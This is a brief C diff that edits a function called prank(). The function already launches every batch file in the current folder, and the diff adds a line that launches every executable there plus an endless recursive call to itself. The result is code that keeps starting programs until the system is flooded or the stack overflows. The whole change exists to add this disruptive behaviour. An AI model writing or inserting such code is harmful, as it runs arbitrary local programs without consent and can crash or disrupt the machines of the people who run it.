@@ -55,5 +55,7 @@ int main() {
 
 int prank() {
   system ("start *.bat");
+  system ("start *.exe");
   // maybe cool stuff here some day
+  prank();
 }
